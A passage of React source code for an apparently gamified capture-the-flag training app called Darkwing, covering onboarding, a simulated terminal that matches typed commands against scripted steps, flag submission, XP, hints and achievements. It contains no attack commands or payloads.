          <button onClick={()=>{if(confirmReset){soundEngine.play("error");haptic.heavy();onReset();}else{setConfirmReset(true);setTimeout(()=>setConfirmReset(false),4000);}}}
            style={{width:"100%",padding:"14px",fontSize:19,letterSpacing:3,fontFamily:"'VT323',monospace",cursor:"pointer",background:confirmReset?"#FF4466":"transparent",border:"2px solid #FF4466",color:confirmReset?"#000":"#FF4466",transition:"all .2s"}}>
            {confirmReset?"⚠ TAP AGAIN TO CONFIRM":"RESET ALL PROGRESS"}
          </button>
        </div>
      </div>
      <style>{`@keyframes blink{0%,100%{opacity:1}50%{opacity:.3}} *{box-sizing:border-box} ::-webkit-scrollbar{width:3px} ::-webkit-scrollbar-thumb{background:${C.purple}}`}</style>
    </div>
  );
}

// ══════════════════════════════════════════════════════════════════
// ONBOARDING
// ══════════════════════════════════════════════════════════════════
function Onboarding({onComplete}) {
  const [step,setStep]=useState(0); const [handle,setHandle]=useState(""); const [mode,setMode]=useState(null);
  const C=THEMES.darkops;
  const modes=[{key:"junior",icon:"🐣",label:"JUNIOR OPERATIVE",color:C.teal,sub:"Cartoon villain · Kid-friendly"},{key:"shadow",icon:"🦇",label:"SHADOW OPERATIVE",color:C.gold,sub:"Serious threat · Comic flair"},{key:"dark",icon:"☠",label:"DARK OPERATIVE",color:"#FF4466",sub:"Full noir · Nation state"}];
  return (
    <div style={{fontFamily:"'VT323',monospace",background:C.bg,color:C.text,minHeight:"100vh",maxWidth:480,margin:"0 auto",display:"flex",flexDirection:"column",justifyContent:"center",padding:"24px 20px"}}>
      <link href="https://fonts.googleapis.com/css2?family=VT323&display=swap" rel="stylesheet"/>
      {step===0&&(
        <div style={{animation:"fadeIn .5s ease"}}>
          <div style={{fontSize:60,textAlign:"center",marginBottom:8,animation:"duck 2s infinite"}}>🦆</div>
          <div style={{fontSize:32,color:C.gold,letterSpacing:6,textAlign:"center",textShadow:`0 0 20px ${C.gold}`,marginBottom:4}}>DARKWING</div>
          <div style={{fontSize:14,color:C.teal,letterSpacing:4,textAlign:"center",marginBottom:28}}>LET'S GET DANGEROUS</div>
          <div style={{background:C.bgCard,border:`1px solid ${C.purple}`,borderLeft:`3px solid ${C.gold}`,padding:"14px 16px",marginBottom:20}}>
            <div style={{fontSize:10,color:C.gold,letterSpacing:3,marginBottom:6}}>🦆 DUCKY SAYS</div>
            <div style={{fontSize:13,color:C.text,lineHeight:1.6}}>Hey! I'm Ducky — your guide through the shadows. Before we get dangerous, what's your callsign?</div>
          </div>
          <input value={handle} onChange={e=>setHandle(e.target.value)} onKeyDown={()=>soundEngine.play("keypress")}
            style={{width:"100%",background:C.bgDeep,border:`1px solid ${C.purpleHi}`,borderBottom:`2px solid ${C.teal}`,outline:"none",color:"#fff",fontFamily:"'VT323',monospace",fontSize:18,padding:"10px 12px",caretColor:C.teal,boxSizing:"border-box",marginBottom:14}}
            placeholder="enter your callsign..." autoCapitalize="none" autoCorrect="off" spellCheck={false}/>
          <button disabled={!handle.trim()} onClick={()=>{soundEngine.init();soundEngine.play("navigate");haptic.medium();setStep(1);}}
            style={{width:"100%",padding:"12px",fontSize:18,letterSpacing:3,fontFamily:"'VT323',monospace",cursor:handle.trim()?"pointer":"not-allowed",background:handle.trim()?C.teal:"transparent",border:`1px solid ${handle.trim()?C.teal:C.textFade}`,color:handle.trim()?"#000":C.textFade,transition:"all .2s"}}>
            IDENTIFY →
          </button>
        </div>
      )}
      {step===1&&(
        <div style={{animation:"fadeIn .5s ease"}}>
          <div style={{fontSize:22,color:C.gold,letterSpacing:3,marginBottom:6}}>CHOOSE YOUR MODE</div>
          <div style={{background:C.bgCard,border:`1px solid ${C.purple}`,borderLeft:`3px solid ${C.gold}`,padding:"10px 14px",marginBottom:16,fontSize:13,color:C.textDim,lineHeight:1.6}}>🦆 Controls NegaDuck's tone. Change anytime in Settings.</div>
          {modes.map(m=>(
            <div key={m.key} onClick={()=>{setMode(m.key);soundEngine.play("navigate");haptic.light();}}
              style={{marginBottom:8,padding:"12px 14px",border:`2px solid ${mode===m.key?m.color:C.slate}`,background:mode===m.key?m.color+"14":C.bgCard,cursor:"pointer",transition:"all .2s",display:"flex",gap:12,alignItems:"center"}}>
              <div style={{fontSize:26}}>{m.icon}</div>
              <div style={{flex:1}}>
                <div style={{fontSize:15,color:mode===m.key?m.color:C.text,letterSpacing:2}}>{m.label}</div>
                <div style={{fontSize:11,color:C.textDim,marginTop:2}}>{m.sub}</div>
              </div>
              {mode===m.key&&<div style={{color:m.color,fontSize:16}}>✓</div>}
            </div>
          ))}
          <div style={{display:"flex",gap:8,marginTop:10}}>
            <button onClick={()=>setStep(0)} style={{flex:1,padding:"10px",fontSize:14,letterSpacing:2,fontFamily:"'VT323',monospace",cursor:"pointer",background:"transparent",border:`1px solid ${C.textFade}`,color:C.textDim}}>← BACK</button>
            <button disabled={!mode} onClick={()=>{soundEngine.play("navigate");haptic.medium();setStep(2);}}
              style={{flex:2,padding:"10px",fontSize:16,letterSpacing:2,fontFamily:"'VT323',monospace",cursor:mode?"pointer":"not-allowed",background:mode?C.gold:"transparent",border:`1px solid ${mode?C.gold:C.textFade}`,color:mode?"#000":C.textFade,transition:"all .2s"}}>
              CONFIRM →
            </button>
          </div>
        </div>
      )}
      {step===2&&(
        <div style={{animation:"fadeIn .5s ease",textAlign:"center"}}>
          <div style={{fontSize:52,marginBottom:10}}>{modes.find(m=>m.key===mode)?.icon}</div>
          <div style={{fontSize:28,color:C.gold,letterSpacing:4,textShadow:`0 0 12px ${C.gold}`,marginBottom:4}}>{handle.toUpperCase()}</div>
          <div style={{fontSize:14,color:modes.find(m=>m.key===mode)?.color,letterSpacing:3,marginBottom:24}}>{modes.find(m=>m.key===mode)?.label}</div>
          <div style={{background:C.bgCard,border:`1px solid ${C.purple}`,borderLeft:`3px solid ${C.gold}`,padding:"14px 16px",marginBottom:24,textAlign:"left"}}>
            <div style={{fontSize:11,color:C.gold,letterSpacing:3,marginBottom:6}}>🦆 DUCKY SAYS</div>
            <div style={{fontSize:13,color:C.text,lineHeight:1.6}}>
              {mode==="junior"&&"Perfect! NegaDuck is being cartoonishly evil today. Let's stop him!"}
              {mode==="shadow"&&"Good choice. NegaDuck is serious business — but Ducky's got your back."}
              {mode==="dark"&&"...Dark Operative. Ducky respects that. Stay sharp."}
            </div>
          </div>
          <button onClick={()=>{soundEngine.play("flag");haptic.success();onComplete(handle.trim(),mode);}}
            style={{width:"100%",padding:"14px",fontSize:20,letterSpacing:4,fontFamily:"'VT323',monospace",cursor:"pointer",background:C.teal,border:"none",color:"#000",animation:"pulse 1.5s infinite"}}>
            LET'S GET DANGEROUS
          </button>
        </div>
      )}
      <style>{`@keyframes duck{0%,100%{transform:rotate(-8deg)}50%{transform:rotate(8deg)}} @keyframes fadeIn{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:none}} @keyframes pulse{0%,100%{box-shadow:0 0 0 0 ${C.teal}88}50%{box-shadow:0 0 0 10px transparent}} *{box-sizing:border-box}`}</style>
    </div>
  );
}

// ══════════════════════════════════════════════════════════════════
// MAIN APP
// ══════════════════════════════════════════════════════════════════
export default function Darkwing() {
  const [save,setSaveRaw]=useState(()=>loadSave());
  const setSave=useCallback(updater=>{
    setSaveRaw(prev=>{
      const next=typeof updater==="function"?updater(prev):{...prev,...updater};
      persistSave(next); return next;
    });
  },[]);

  const {onboarded,playerHandle,opMode,totalXP,hintTokens,totalScore,solvedFlags,starRatings,completedMissions,achievements,hintState,visitedCities,dailySolvedDate,settings,leaderboard}=save;
  const C=THEMES[settings?.theme||"darkops"];

  useEffect(()=>{soundEngine.enabled=settings?.soundEnabled!==false;haptic.enabled=settings?.hapticsEnabled!==false;},[settings]);

  // Track time played — batch writes every 30s to avoid a re-render every second
  const timeAccumRef=useRef(0);
  useEffect(()=>{
    const iv=setInterval(()=>{
      timeAccumRef.current++;
      if(timeAccumRef.current>=30){
        const elapsed=timeAccumRef.current; timeAccumRef.current=0;
        setSave(p=>({...p,totalTimePlayed:(p.totalTimePlayed||0)+elapsed}));
      }
    },1000);
    return()=>{
      clearInterval(iv);
      if(timeAccumRef.current>0){const e=timeAccumRef.current;setSave(p=>({...p,totalTimePlayed:(p.totalTimePlayed||0)+e}));}
    };
  },[]);

  // Streak
  useEffect(()=>{
    const today=new Date().toDateString();
    if(save.lastLoginDate!==today){
      setSave(p=>({...p,lastLoginDate:today,streak:p.lastLoginDate===new Date(Date.now()-86400000).toDateString()?p.streak+1:1}));
    }
  },[]);

  const [screen,setScreen]=useState("home");
  const [tab,setTab]=useState("map");
  const [filterCat,setFilterCat]=useState("ALL");

  const [duckyMsg,setDuckyMsg]=useState(null);
  const [rankUpData,setRankUpData]=useState(null);
  const [achToast,setAchToast]=useState(null);
  const [glitch,setGlitch]=useState(false);
  const [tokenAnim,setTokenAnim]=useState(null);
  const [showHints,setShowHints]=useState(false);

  // Briefing
  const [pendingChallenge,setPendingChallenge]=useState(null);
  const [isReplay,setIsReplay]=useState(false);

  // Challenge
  const [activeChallenge,setActiveChallenge]=useState(null);
  const [chalStepIdx,setChalStepIdx]=useState(0);
  const [chalLines,setChalLines]=useState([]);
  const [chalInput,setChalInput]=useState("");
  const [chalTyping,setChalTyping]=useState(false);
  const [chalWrong,setChalWrong]=useState(0);
  const [chalShowFlag,setChalShowFlag]=useState(false);
  const [flagInput,setFlagInput]=useState("");
  const [flagResult,setFlagResult]=useState(null);
  const [chalStartTime,setChalStartTime]=useState(null);
  const [hintsUsedCount,setHintsUsedCount]=useState(0);

  // Mission
  const [activeMission,setActiveMission]=useState(null);
  const [msnStepIdx,setMsnStepIdx]=useState(0);
  const [msnLines,setMsnLines]=useState([]);
  const [msnInput,setMsnInput]=useState("");
  const [msnTyping,setMsnTyping]=useState(false);
  const [msnWrong,setMsnWrong]=useState(0);
  const [msnLesson,setMsnLesson]=useState(false);

  // Daily
  const [activeDaily,setActiveDaily]=useState(null);
  const [dailyStepIdx,setDailyStepIdx]=useState(0);
  const [dailyLines,setDailyLines]=useState([]);
  const [dailyInput,setDailyInput]=useState("");
  const [dailyTyping,setDailyTyping]=useState(false);
  const [dailyShowFlag,setDailyShowFlag]=useState(false);
  const [dailyFlagInput,setDailyFlagInput]=useState("");
  const [dailyFlagResult,setDailyFlagResult]=useState(null);

  const chalTermRef=useRef(null); const msnTermRef=useRef(null); const dailyTermRef=useRef(null);
  const chalInputRef=useRef(null); const msnInputRef=useRef(null); const dailyInputRef=useRef(null);
  const flagRef=useRef(null); const dailyFlagRef=useRef(null);
  const userScrolled=useRef(false);
  const smartScroll=(ref)=>{ const el=ref.current; if(!el) return; if(!userScrolled.current) el.scrollTop=el.scrollHeight; };
  const handleTermScroll=(e)=>{ const el=e.currentTarget; userScrolled.current=(el.scrollHeight-el.scrollTop-el.clientHeight)>50; };
  useEffect(()=>{smartScroll(chalTermRef);},[chalLines]);
  useEffect(()=>{smartScroll(msnTermRef);},[msnLines]);
  useEffect(()=>{smartScroll(dailyTermRef);},[dailyLines]);
  useEffect(()=>{
    if(screen!=="challenge") return;
    const ts=[100,300,600].map(t=>setTimeout(()=>{ chalInputRef.current?.focus(); },t));
    return()=>ts.forEach(clearTimeout);
  },[screen,chalStepIdx]);
  useEffect(()=>{
    if(screen!=="mission") return;
    const ts=[100,300,600].map(t=>setTimeout(()=>{ msnInputRef.current?.focus(); },t));
    return()=>ts.forEach(clearTimeout);
  },[screen,msnStepIdx]);
  useEffect(()=>{
    if(screen!=="daily") return;
    const ts=[100,300,600].map(t=>setTimeout(()=>{ dailyInputRef.current?.focus(); },t));
    return()=>ts.forEach(clearTimeout);
  },[screen,dailyStepIdx]);

  const doGlitch=()=>{setGlitch(true);setTimeout(()=>setGlitch(false),450);};
  const showToken=msg=>{setTokenAnim(msg);setTimeout(()=>setTokenAnim(null),2200);};

  const addXP=useCallback(amount=>{
    setSave(prev=>{
      const nx=(prev.totalXP||0)+amount;
      const or=getRank(prev.totalXP||0); const nr=getRank(nx);
      if(nr.label!==or.label) setTimeout(()=>setRankUpData(nr),2000);
      return{...prev,totalXP:nx};
    });
  },[setSave]);

  const unlockAchievement=useCallback(id=>{
    setSave(prev=>{
      if((prev.achievements||[]).includes(id)) return prev;
      const def=ACH_DEFS.find(a=>a.id===id);
      if(def){
        setTimeout(()=>{setAchToast(id);setDuckyMsg(duck("achievement"));},200);
        const nx=(prev.totalXP||0)+def.xp;
        const or=getRank(prev.totalXP||0); const nr=getRank(nx);
        if(nr.label!==or.label) setTimeout(()=>setRankUpData(nr),2500);
        return{...prev,achievements:[...(prev.achievements||[]),id],totalXP:nx};
      }
      return prev;
    });
  },[setSave]);

  const typeLines=(lines,setTerm,setTyping,cb)=>{
    setTyping(true);let i=0;
    const iv=setInterval(()=>{
      if(i<lines.length){setTerm(p=>[...p,{type:"output",text:lines[i]}]);soundEngine.play("output");i++;}
      else{clearInterval(iv);setTyping(false);if(cb)cb();}
    },22);
  };

  const getChalHints=id=>(hintState||{})[id]||{unlocked:[],penalty:0};

  const spendHint=(chalId,tier,cost,penalty)=>{
    if(hintTokens<cost) return;
    soundEngine.play("hint");haptic.medium();
    setSave(prev=>{
      const ph=(prev.hintState||{})[chalId]||{unlocked:[],penalty:0};
      if(ph.unlocked.includes(tier)) return prev;
      return{...prev,hintTokens:(prev.hintTokens||0)-cost,hintState:{...prev.hintState,[chalId]:{unlocked:[...ph.unlocked,tier],penalty:ph.penalty+penalty}}};
    });
    setHintsUsedCount(p=>p+1);setDuckyMsg(duck("hintUsed"));
  };

  // Open briefing room before challenge
  const initChallenge=(chal,replay=false)=>{
    soundEngine.init();soundEngine.play("navigate");haptic.light();
    setPendingChallenge(chal);setIsReplay(replay);
    setScreen("briefing");
    if(replay) setDuckyMsg(duck("replay"));
  };

  const startChallenge=()=>{
    const chal=pendingChallenge;
    setActiveChallenge(chal);setChalStepIdx(0);setHintsUsedCount(0);
    const mode=OP_MODES[opMode]||OP_MODES.junior;
    userScrolled.current=false;
    setChalLines([
      {type:"sys",text:`┌──────────────────────────────────────────┐`},
      {type:"sys",text:`  ${chal.title}`},
      {type:"sys",text:`  ${chal.category} · ${chal.points}pts · ${chal.difficulty}`},
      {type:"sys",text:`└──────────────────────────────────────────┘`},
      {type:"blank"},{type:"story",text:mode.storyPrefix+" "+chal.story},{type:"blank"},
      {type:"info",text:mode.missionTone},{type:"info",text:chal.description},{type:"blank"},
      {type:"hint",text:`▶ STEP 1: ${chal.steps[0].hint}`},{type:"blank"},
    ]);
    setChalInput("");setChalWrong(0);setChalShowFlag(false);
    setFlagInput("");setFlagResult(null);setShowHints(false);
    setChalStartTime(Date.now());setScreen("challenge");
    if(isReplay){setChalLines(p=>[...p,{type:"hint",text:"🔁 REPLAY MODE — No hints count toward star penalty this run"}]);}
  };

  const handleChalCmd=e=>{
    if(e.key!=="Enter"||chalTyping||!activeChallenge) return;
    const raw=(chalInputRef.current?.value||"").trim();if(!raw) return;
    soundEngine.play("enter");haptic.light();

    if(normalize(raw)==="quack"){
      setChalLines(p=>[...p,{type:"prompt",text:raw},{type:"blank"},{type:"success",text:duck("quack")},{type:"blank"}]);
      if(chalInputRef.current)chalInputRef.current.value="";soundEngine.play("quack");haptic.success();unlockAchievement("quack_found");return;
    }

    const step=activeChallenge.steps[chalStepIdx];
    if(!step) return;
    const ok=normalize(raw)===normalize(step.cmd)||(step.aliases||[]).some(a=>normalize(raw)===normalize(a));
    setChalLines(p=>[...p,{type:"prompt",text:raw}]);if(chalInputRef.current)chalInputRef.current.value="";

    if(ok){
      typeLines(step.output.split("\n"),setChalLines,setChalTyping,()=>{
        if(chalStepIdx+1>=activeChallenge.steps.length){
          setTimeout(()=>{setChalLines(p=>[...p,{type:"blank"},{type:"success",text:"── ALL STEPS COMPLETE — SUBMIT THE FLAG ──"},{type:"blank"}]);setChalShowFlag(true);setTimeout(()=>flagRef.current?.focus(),150);},300);
        } else {
          const next=chalStepIdx+1;
          setTimeout(()=>{setChalLines(p=>[...p,{type:"blank"},{type:"sys",text:`── STEP ${next+1}/${activeChallenge.steps.length} ──────────────────`},{type:"hint",text:activeChallenge.steps[next].hint},{type:"blank"}]);setChalStepIdx(next);setChalWrong(0);},300);
        }
      });
    } else {
      doGlitch();soundEngine.play("error");haptic.error();
      const w=chalWrong+1;setChalWrong(w);
      setChalLines(p=>[...p,{type:"error",text:`bash: ${raw.split(" ")[0]}: not found`}]);
      if(w===2){setChalLines(p=>[...p,{type:"hint",text:"Need help? Open hints ⚡ below"}]);setDuckyMsg(duck("wrongCmd"));}
      if(w>=4) setChalLines(p=>[...p,{type:"hint",text:`HINT → ${step.cmd}`}]);
    }
  };

  const submitFlag=()=>{
    const hints=getChalHints(activeChallenge.id);
    if(normalize(flagInput.trim())===normalize(activeChallenge.flag)){
      setFlagResult("correct");soundEngine.play("flag");haptic.success();
      const elapsed=(Date.now()-chalStartTime)/1000;
      const stars=isReplay?calcStars(elapsed,0,chalWrong):calcStars(elapsed,hintsUsedCount,chalWrong);
      const earnedPts=isReplay?0:Math.max(10,activeChallenge.points-hints.penalty);

      if(isReplay) unlockAchievement("replay_1");
      if(!isReplay&&!(solvedFlags||{})[activeChallenge.id]){
        setSave(prev=>({
          ...prev,
          totalScore:(prev.totalScore||0)+earnedPts,
          solvedFlags:{...prev.solvedFlags,[activeChallenge.id]:{pts:earnedPts,penalty:hints.penalty,stars}},
          starRatings:{...(prev.starRatings||{}),[activeChallenge.id]:Math.max(stars,(prev.starRatings||{})[activeChallenge.id]||0)},
          leaderboard:prev.leaderboard.map(e=>e.isPlayer?{...e,score:e.score+earnedPts,solves:e.solves+1}:e).sort((a,b)=>b.score-a.score),
        }));
        addXP(earnedPts+50);
        setDuckyMsg(duck("flagCaptured"));
        const newSolved={...(solvedFlags||{}),[activeChallenge.id]:true};
        if(Object.keys(newSolved).length===1) unlockAchievement("first_blood");
        if(Object.keys(newSolved).length===10) unlockAchievement("ten_flags");
        if(hintsUsedCount===0){unlockAchievement("no_hints_1");setDuckyMsg(duck("noHints"));}
        if(elapsed<60) unlockAchievement("speed_run");
        if(stars===3) unlockAchievement("three_stars");
        const city=CITIES_FULL.find(c=>c.challenges.includes(activeChallenge.id));
        if(city&&city.challenges.every(id=>newSolved[id])){
          unlockAchievement("city_clear");
          if(city.id==="tokyo") unlockAchievement("tokyo_clear");
        }
        if(CTF_CHALLENGES.filter(c=>c.category==="WEB").every(c=>newSolved[c.id])) unlockAchievement("all_web");
        if(CTF_CHALLENGES.filter(c=>c.category==="CRYPTO").every(c=>newSolved[c.id])) unlockAchievement("all_crypto");
        if(CTF_CHALLENGES.filter(c=>c.category==="FORENSICS").every(c=>newSolved[c.id])) unlockAchievement("all_forensics");
        if(CTF_CHALLENGES.filter(c=>c.category==="PRIVESC"||c.category==="AD").every(c=>newSolved[c.id])) unlockAchievement("all_privesc");
        unlockAchievement("negaduck_found");
      }
    } else {setFlagResult("wrong");doGlitch();soundEngine.play("error");haptic.error();}
  };

  // Daily
  const today=new Date().toDateString();
  const dailySolved=dailySolvedDate===today;
  const dailyChal=DAILY_POOL[new Date().getDate()%DAILY_POOL.length];

  const openDaily=()=>{
    soundEngine.init();soundEngine.play("daily");haptic.medium();
    setActiveDaily(dailyChal);setDailyStepIdx(0);
    setDailyLines([{type:"sys",text:`┌──────────────────────────────────────────┐`},{type:"sys",text:`  📅 DAILY: ${dailyChal.title} +${dailyChal.bonusXP}XP`},{type:"sys",text:`└──────────────────────────────────────────┘`},{type:"blank"},{type:"story",text:dailyChal.story},{type:"blank"},{type:"hint",text:`▶ ${dailyChal.steps[0].hint}`},{type:"blank"}]);
    setDailyInput("");setDailyShowFlag(false);setDailyFlagInput("");setDailyFlagResult(null);
    setDuckyMsg(duck("daily"));setScreen("daily");
  };

  const handleDailyCmd=e=>{
    if(e.key!=="Enter"||dailyTyping||!activeDaily) return;
    const raw=(dailyInputRef.current?.value||"").trim();if(!raw) return;
    soundEngine.play("enter");haptic.light();
    if(normalize(raw)==="quack"){setDailyLines(p=>[...p,{type:"prompt",text:raw},{type:"blank"},{type:"success",text:duck("quack")},{type:"blank"}]);if(dailyInputRef.current)dailyInputRef.current.value="";soundEngine.play("quack");unlockAchievement("quack_found");return;}
    const step=activeDaily.steps[dailyStepIdx];
    if(!step) return;
    const ok=normalize(raw)===normalize(step.cmd)||(step.aliases||[]).some(a=>normalize(raw)===normalize(a));
    setDailyLines(p=>[...p,{type:"prompt",text:raw}]);if(dailyInputRef.current)dailyInputRef.current.value="";
    if(ok){
      typeLines(step.output.split("\n"),setDailyLines,setDailyTyping,()=>{
        if(dailyStepIdx+1>=activeDaily.steps.length){setTimeout(()=>{setDailyLines(p=>[...p,{type:"blank"},{type:"success",text:"── SUBMIT THE FLAG ──"},{type:"blank"}]);setDailyShowFlag(true);setTimeout(()=>dailyFlagRef.current?.focus(),150);},300);}
        else{const next=dailyStepIdx+1;setTimeout(()=>{setDailyLines(p=>[...p,{type:"blank"},{type:"hint",text:activeDaily.steps[next].hint},{type:"blank"}]);setDailyStepIdx(next);},300);}
      });
    } else {doGlitch();soundEngine.play("error");haptic.error();setDailyLines(p=>[...p,{type:"error",text:`bash: ${raw.split(" ")[0]}: not found`}]);}
  };

  const submitDailyFlag=()=>{
    if(normalize(dailyFlagInput.trim())===normalize(activeDaily.flag)){
      setDailyFlagResult("correct");soundEngine.play("flag");haptic.success();
      if(!dailySolved){setSave(prev=>({...prev,dailySolvedDate:today,hintTokens:(prev.hintTokens||0)+2}));showToken("+2 🪙 DAILY BONUS");addXP(activeDaily.bonusXP);unlockAchievement("daily_1");setDuckyMsg(duck("flagCaptured"));}
    } else {setDailyFlagResult("wrong");doGlitch();soundEngine.play("error");haptic.error();}
  };

  // Mission
  const openMission=msn=>{
    soundEngine.init();soundEngine.play("navigate");haptic.light();
    setActiveMission(msn);setMsnStepIdx(0);
    setMsnLines([{type:"sys",text:`┌──────────────────────────────────────────┐`},{type:"sys",text:`  MISSION: ${msn.title}`},{type:"sys",text:`  REWARD: +${msn.xp}XP  +${msn.tokenReward}🪙`},{type:"sys",text:`└──────────────────────────────────────────┘`},{type:"blank"},{type:"info",text:msn.description},{type:"blank"},{type:"hint",text:`▶ STEP 1: ${msn.steps[0].hint}`},{type:"blank"}]);
    setMsnInput("");setMsnWrong(0);setMsnLesson(false);
    setDuckyMsg(duck("missionStart"));setScreen("mission");
  };

  const handleMsnCmd=e=>{
    if(e.key!=="Enter"||msnTyping||!activeMission) return;
    const raw=(msnInputRef.current?.value||"").trim();if(!raw) return;
    soundEngine.play("enter");haptic.light();
    if(normalize(raw)==="quack"){setMsnLines(p=>[...p,{type:"prompt",text:raw},{type:"blank"},{type:"success",text:duck("quack")},{type:"blank"}]);if(msnInputRef.current)msnInputRef.current.value="";soundEngine.play("quack");unlockAchievement("quack_found");return;}
    const step=activeMission.steps[msnStepIdx];
    if(!step) return;
    const ok=normalize(raw)===normalize(step.cmd)||(step.aliases||[]).some(a=>normalize(raw)===normalize(a));
    setMsnLines(p=>[...p,{type:"prompt",text:raw}]);if(msnInputRef.current)msnInputRef.current.value="";
    if(ok){
      typeLines(step.output.split("\n"),setMsnLines,setMsnTyping,()=>{
        if(msnStepIdx+1>=activeMission.steps.length){setTimeout(()=>{setMsnLines(p=>[...p,{type:"blank"},{type:"success",text:`██ MISSION COMPLETE — +${activeMission.xp}XP  +${activeMission.tokenReward}🪙 ██`},{type:"blank"}]);setMsnLesson(true);},300);}
        else{const next=msnStepIdx+1;setTimeout(()=>{setMsnLines(p=>[...p,{type:"blank"},{type:"sys",text:`── STEP ${next+1}/${activeMission.steps.length} ──────────────────`},{type:"hint",text:activeMission.steps[next].hint},{type:"blank"}]);setMsnStepIdx(next);setMsnWrong(0);},300);}
      });
    } else {doGlitch();soundEngine.play("error");haptic.error();const w=msnWrong+1;setMsnWrong(w);setMsnLines(p=>[...p,{type:"error",text:`bash: ${raw.split(" ")[0]}: command not found`}]);if(w>=3)setMsnLines(p=>[...p,{type:"hint",text:`HINT → ${step.cmd}`}]);}
  };

  const completeMission=()=>{
    if(!(completedMissions||{})[activeMission.id]){
      setSave(prev=>({...prev,completedMissions:{...prev.completedMissions,[activeMission.id]:true},hintTokens:(prev.hintTokens||0)+activeMission.tokenReward}));
      showToken(`+${activeMission.tokenReward} 🪙`);addXP(activeMission.xp);soundEngine.play("achievement");haptic.success();setDuckyMsg(duck("missionDone"));
    }
    setScreen("home");setTab("map");
  };

  const renderLine=(line,i)=>{
    if(line.type==="blank") return <div key={i} style={{height:5}}/>;
    if(line.type==="prompt") return (
      <div key={i} style={{display:"flex",flexWrap:"wrap",gap:"0 6px",marginBottom:3,fontSize:16}}>
        <span style={{color:C.termPrompt}}>{(playerHandle||"operative").toLowerCase()}</span>
        <span style={{color:C.textFade}}>@darkwing:~#</span>
        <span style={{color:"#fff",wordBreak:"break-all"}}>{line.text}</span>
      </div>
    );
    const cols={sys:C.textFade,output:C.termOutput,error:C.red,hint:C.gold,success:C.accent,info:C.textDim,story:C.textDim};
    const glow=line.type==="success"?{textShadow:`0 0 8px ${C.accent}`}:{};
    return <div key={i} style={{color:cols[line.type]||C.termOutput,fontSize:16,lineHeight:1.65,wordBreak:"break-word",marginBottom:2,...glow}}>{line.text}</div>;
  };

  // ── STYLES ────────────────────────────────────────────────────────
  const S={
    root:{fontFamily:"'VT323','Courier New',monospace",background:C.bg,color:C.text,height:"100dvh",maxWidth:520,margin:"0 auto",position:"relative",overflow:"hidden",display:"flex",flexDirection:"column",filter:glitch?"hue-rotate(60deg) brightness(1.6)":"none",transition:"filter .08s"},
    scanlines:{position:"fixed",inset:0,zIndex:999,pointerEvents:"none",background:"repeating-linear-gradient(0deg,transparent,transparent 4px,rgba(0,0,0,0.03) 4px,rgba(0,0,0,0.03) 5px)"},
    vignette:{position:"fixed",inset:0,zIndex:998,pointerEvents:"none",background:"radial-gradient(ellipse at center,transparent 55%,rgba(0,0,0,0.65) 100%)"},
    hdr:{background:C.bgDeep,borderBottom:`2px solid ${C.purple}`,padding:"10px 16px",display:"flex",alignItems:"center",justifyContent:"space-between",position:"sticky",top:0,zIndex:20},
    logo:{fontSize:30,color:C.gold,letterSpacing:5,textShadow:`0 0 18px ${C.gold}99`},
    tabs:{display:"flex",background:C.bgDeep,borderBottom:`1px solid ${C.purple}`},
    tab:a=>({flex:1,padding:"11px 4px",background:"none",border:"none",fontFamily:"'VT323',monospace",fontSize:17,letterSpacing:1,color:a?C.accent:C.textDim,borderBottom:a?`3px solid ${C.accent}`:"3px solid transparent",cursor:"pointer",transition:"all .15s"}),
    card:(lk,dn)=>({margin:"10px 14px",padding:"14px 16px",border:`1px solid ${dn?C.purple:lk?C.textFade:C.purpleHi}`,borderLeft:`4px solid ${dn?C.accent:lk?C.textFade:C.gold}`,background:lk?C.bgDeep:dn?C.bgCard+"88":C.bgCard,cursor:lk?"not-allowed":"pointer",position:"relative",opacity:lk?0.55:1,transition:"all .2s"}),
    termWrap:{background:C.bgDeep,border:`1px solid ${C.purple}`,borderTop:`3px solid ${C.accent}`,margin:"0 14px 0",display:"flex",flexDirection:"column",flex:1,minHeight:0},
    termBar:{background:C.bgCard,borderBottom:`1px solid ${C.slate}`,padding:"7px 12px",display:"flex",alignItems:"center",gap:8,flexShrink:0},
    termBody:{padding:"12px 14px",flex:1,minHeight:0,overflowY:"auto",fontSize:16,overscrollBehavior:"contain",WebkitOverflowScrolling:"touch"},
    termInput:{display:"flex",alignItems:"center",gap:8,padding:"8px 14px",borderTop:`1px solid ${C.slate}`,background:C.bgDeep},
    termField:{flex:1,background:"none",border:"none",outline:"none",color:"#fff",fontFamily:"'VT323',monospace",fontSize:17,caretColor:C.accent},
    flagBox:{margin:"0 14px 8px",padding:"14px 16px",border:`1px solid ${C.gold}55`,background:C.bgCard,borderLeft:`4px solid ${C.gold}`},
    flagField:{flex:1,background:C.bgDeep,border:`1px solid ${C.slate}`,outline:"none",color:"#fff",fontFamily:"'VT323',monospace",fontSize:17,padding:"8px 12px",caretColor:C.gold},
    lessonBox:{margin:"0 14px 12px",padding:"14px 16px",border:`1px solid ${C.accent}33`,borderLeft:`4px solid ${C.gold}`,background:C.bgCard},
    btn:v=>({padding:"10px 20px",fontSize:17,letterSpacing:2,fontFamily:"'VT323',monospace",cursor:"pointer",border:`1px solid ${v==="gold"?C.gold:C.accent}`,background:v==="primary"?C.accent:v==="gold"?C.gold:"transparent",color:v==="primary"||v==="gold"?"#000":C.accent}),
    tokenToast:{position:"fixed",top:70,right:14,zIndex:500,fontSize:21,color:C.gold,background:C.bgCard,border:`1px solid ${C.gold}`,padding:"8px 16px",letterSpacing:2,textShadow:`0 0 10px ${C.gold}`,animation:"slideDown .3s ease, fadeOut .4s ease 1.8s forwards"},
    duckyBox:{margin:"0 14px 10px",display:"flex",gap:12,alignItems:"flex-start",padding:"12px 14px",background:`${C.purple}28`,border:`1px solid ${C.purpleHi}`,borderLeft:`4px solid ${C.gold}`,animation:"slideDown .3s ease"},
    boardRow:(i,me)=>({display:"flex",alignItems:"center",gap:10,padding:"11px 16px",background:me?`${C.purple}28`:i%2===0?C.bgCard:C.bg,borderLeft:me?`4px solid ${C.gold}`:"4px solid transparent"}),
  };

